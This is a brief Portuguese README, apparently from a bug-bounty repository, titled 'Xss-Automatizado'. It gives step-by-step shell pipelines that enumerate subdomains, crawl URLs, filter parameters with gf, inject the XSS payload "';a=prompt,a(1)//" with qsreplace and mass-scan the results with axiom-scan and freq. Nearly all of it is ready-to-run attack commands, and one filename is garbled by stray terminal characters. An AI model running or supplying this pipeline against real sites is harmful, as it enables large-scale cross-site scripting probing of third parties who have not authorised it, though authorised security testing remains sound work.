# Xss-Automatizado

1 passo enumerar com subfinder,amass..etc > passar os crawlers como gau,katana,wayback

2 passo cat fuzzable_urls.txt | grep FUZZ | gf xss | grep -iavE 'pdf|txt|\?l=FUZZ$|\?contry=FUZZ$|\?q=FUZZ$|is/image' > filte│···················red_fuzzable_urls.txt  

3 passo cat filtered_fuzzable_urls.txt | qsreplace "';a=prompt,a()//" > fuzz.tmp && axiom-scan fuzz.tmp -m freq | grep -v 'Not'

cat fuzz.tmp | /home/freq | anew XSS2.2

Ordem >>>

- cat 3gau 3katana | grep -aiE '^http' | grep -aiE '\?' | qsreplace FUZZ > fuzzable_urls.txt
- cat fuzzable_urls.txt | grep FUZZ | gf xss | grep -iavE 'pdf|txt|\?l=FUZZ$|\?contry=FUZZ$|\?q=FUZZ$|is/image' > filtered_fuzzable_urls.txt
- cat filtered_fuzzable_urls.txt | qsreplace "';a=prompt,a(1)//" > fuzz.tmp && axiom-scan fuzz.tmp -m freq | grep -v 'Not'
- cat filtered_fuzzable_urls.txt | qsreplace "';a=prompt,a(1)//" > fuzz.tmp                 
- cat fuzz.tmp | /home/freq | anew XSS2.2
